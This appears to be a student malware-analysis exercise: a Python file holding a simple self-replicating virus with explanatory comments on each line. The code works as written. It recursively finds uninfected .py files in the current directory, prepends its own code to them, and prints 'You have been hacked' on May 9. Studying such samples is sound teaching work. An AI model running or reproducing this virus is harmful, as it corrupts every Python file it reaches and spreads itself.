#!/usr/bin/python

# Script Name: Malware Analysis
# Author: Shay Crane
# Date of last revision: 09/17/2022
# Purpose:  an analysis of a simple virus written in python3. 

# WARNING:  DO NOT EXECUTE THIS SCRIPT. 


# Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
# Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
# Insert comments above the final three lines explaining how the functions are called and what this script appears to do.


import os # calls on the os module
import datetime # calls on the datetime module 

SIGNATURE = "VIRUS" # defines the signature to indicate whether or not a file is already infected with this virus

# function: searches the given path to locate files to be attacked/infected
def locate(path): # defines the function
    files_targeted = [] # defines the files to be targeted using an array (an empty array)
    filelist = os.listdir(path) # list the names of all files in the given directory path
    for fname in filelist: # a "for loop" that will perform an on and for each entry named in the list acquired in line 24
        if os.path.isdir(path+"/"+fname): # checks if the entry is a directory, and if so, continutes to line 27; if not, it continues to line 28
            files_targeted.extend(locate(path+"/"+fname)) # runs the function this script exists in and adds files to the list acquired in line 24
        elif fname[-3:] == ".py": # checks if file is a python script by reading the last three characters in the file name for ".py"
            infected = False # declares variable as false
            for line in open(path+"/"+fname): # a "for loop" that will: 
                if SIGNATURE in line: # infect the files along the path if the signature is not present...
                    infected = True # and set status as true if signature found
                    break
            if infected == False: # or move on if it's already infected.
                files_targeted.append(path+"/"+fname) # appends the file name and path if not already infected
    return files_targeted # returns/recalls all the files not yet infected based on the appendation in line 36

# takes the retuned list of files from line 36 and performs this function on the files contained in the list. 
def infect(files_targeted): # defines the function 
    virus = open(os.path.abspath(__file__)) # opens the malware/virus script
    virusstring = "" # declares variable "virusstring" (empty)
    for i,line in enumerate(virus): # a "for loop" that will run commands on each line of the virus script file...
        if 0 <= i < 39: # if the line is greater than or equal to 0 AND less than 39...
            virusstring += line # the line will be added to the virusstring variable
    virus.close # closes the virus file
    for fname in files_targeted: # for each file name in the defined targeted files, perform the following...
        f = open(fname) # open the file
        temp = f.read() # outputs the file name into variable: "temp"
        f.close() # closes the file
        f = open(fname,"w") # opens the file to add text to it (w = "write")
        f.write(virusstring + temp) # adds text from virussstring variable to the text added to the temp variable and writes it to the contents of the file. 
        f.close() # closes the file

# performs the function if the date and time of the computer match the given date and time in the script. 
def detonate(): # defines the function
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: # defines the attacker's chosen date and time of attack
        print("You have been hacked") # (edited for correct syntax: added parens) prints the text to the screen when the script executes.

# main (the business end of the script that executes all the functions above)
files_targeted = locate(os.path.abspath("")) # defines where to execute the script as the current directory (by leaving the absolute path empty)
infect(files_targeted) # defines the files to be acted upon
detonate() # executes the virus script

